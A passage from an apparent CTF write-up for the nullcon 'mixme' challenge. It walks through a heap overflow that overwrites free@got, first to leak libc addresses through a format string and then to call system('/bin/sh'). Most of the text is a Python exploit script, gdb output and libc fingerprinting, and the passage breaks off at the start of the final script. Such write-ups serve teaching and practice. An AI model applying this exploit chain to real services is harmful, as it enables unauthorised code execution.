</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;CCCC&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;BBBB&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This made the binary crash. The coredump reported the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x843b0c8</span>   <span class="mh">0x843b0c8</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x4</span> <span class="mh">0x4</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xb779cff4</span>  <span class="mh">0xb779cff4</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xbf95245c</span>  <span class="mh">0xbf95245c</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xbf952498</span>  <span class="mh">0xbf952498</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10207</span> <span class="p">[</span> <span class="n">CF</span> <span class="n">PF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x73</span>    <span class="mh">0x73</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x7b</span>    <span class="mh">0x7b</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mh">0x0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x33</span>    <span class="mh">0x33</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">p</span> <span class="n">system</span>
</span><span class='line'><span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7636060</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0xbf95245c</span><span class="p">:</span>    <span class="mh">0x08048bb8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x0843b0c8</span>  <span class="mh">0x00000004</span>
</span><span class='line'>
</span><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="err">$</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x843b0c8</span><span class="p">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># local binary</span>
</span><span class='line'><span class="mi">85850</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c77b0</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mf">63.</span><span class="o">..</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># remote binary</span>
</span><span class='line'><span class="mi">83370</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c0024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'><span class="mf">936e0</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b764a024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/mixme<span class="nv">$ </span>ssh <span class="nb">test</span>@54.163.248.69 -vvv
</span><span class='line'>OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e <span class="m">11</span> Feb 2013
</span><span class='line'>debug1: Reading configuration data /etc/ssh/ssh_config
</span><span class='line'>debug1: /etc/ssh/ssh_config line 19: Applying options <span class="k">for</span> *
</span><span class='line'>debug2: ssh_connect: needpriv 0
</span><span class='line'>debug1: Connecting to 54.163.248.69 <span class="o">[</span>54.163.248.69<span class="o">]</span> port 22.
</span><span class='line'>debug1: Connection established.
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
</span><span class='line'>&lt;snip&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/mixme/libc<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>ls<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> xxd <span class="nv">$i</span> <span class="p">|</span> egrep <span class="s1">&#39;83.?c0.?01.?75&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>libc-2.15-0ubuntu10.9.so
</span><span class='line'>
</span><span class='line'>0043740: <span class="m">8934</span> 24e8 f8f4 <span class="m">0200</span> 83c0 <span class="m">0175</span> b0c7 <span class="m">8570</span>  .4<span class="nv">$.</span>.......u...p
</span><span class='line'>00460a0: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e895 cb02 <span class="m">0083</span> c001 75bb  ....4<span class="nv">$.</span>.......u.
</span><span class='line'>0046720: <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span> fbff ffff ffff  .....u...p......
</span><span class='line'>0046810: 2cc4 <span class="m">0200</span> 83c0 <span class="m">0175</span> a5c7 <span class="m">8570</span> fbff ffff  ,......u...p....
</span><span class='line'>0046890: e8ab c302 <span class="m">0083</span> c001 75ac c785 70fb ffff  ........u...p...
</span><span class='line'>0047320: <span class="m">4424</span> 04e8 18b9 <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span>  D<span class="nv">$.</span>........u...p
</span><span class='line'>0047410: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e825 b802 <span class="m">0083</span> c001 75a4  ....4<span class="nv">$.</span>%......u.
</span><span class='line'>005a180: 83c0 <span class="m">0175</span> a4c7 85b0 efff ffff ffff ffe9  ...u............
</span><span class='line'>005b410: <span class="m">3424</span> e8f9 <span class="m">1001</span> <span class="m">0083</span> c001 75ae c785 b0ef  4<span class="nv">$.</span>.......u.....
</span><span class='line'>005c370: <span class="m">0089</span> <span class="m">3424</span> e897 <span class="m">0101</span> <span class="m">0083</span> c001 <span class="m">7580</span> c785  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>00674c0: 0a00 <span class="m">0000</span> <span class="m">8904</span> 24e8 74b7 <span class="m">0000</span> 83c0 <span class="m">0175</span>  ......<span class="nv">$.</span>t......u
</span><span class='line'>
</span><span class='line'>libc-2.16-0ubuntu6.so
</span><span class='line'>
</span><span class='line'>0047b50: 83c0 <span class="m">0175</span> a8e9 97bf ffff 81e1 ff00 <span class="m">0000</span>  ...u............
</span><span class='line'>005ad90: <span class="m">0083</span> c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..<span class="o">[</span>....M..E
</span><span class='line'>0066ab0: 7cb4 <span class="m">0000</span> 83c0 <span class="m">0175</span> 918d b426 <span class="m">0000</span> <span class="m">0000</span>  <span class="p">|</span>......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-0ubuntu6.4.so
</span><span class='line'>
</span><span class='line'>00471c0: <span class="m">0489</span> <span class="m">3424</span> e817 9e02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>0047920: 24e8 ba96 <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9 74c2 ffff  <span class="nv">$.</span>.......u..t...
</span><span class='line'>005a850: <span class="m">8904</span> 24e8 d801 <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>.......u....
</span><span class='line'>005b3a0: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-13ubuntu3.so
</span><span class='line'>
</span><span class='line'>00472a0: <span class="m">0489</span> <span class="m">3424</span> e877 9c02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>w......u...
</span><span class='line'>0047a00: <span class="m">0000</span> <span class="m">8934</span> 24e8 <span class="m">1695</span> <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9  ...4<span class="nv">$.</span>.......u..
</span><span class='line'>0050e40: <span class="m">8904</span> 24e8 <span class="m">6879</span> <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>hy.....u....
</span><span class='line'>0051990: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066100: 1cae <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc-2.19-0ubuntu6.14.so ./mixme
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
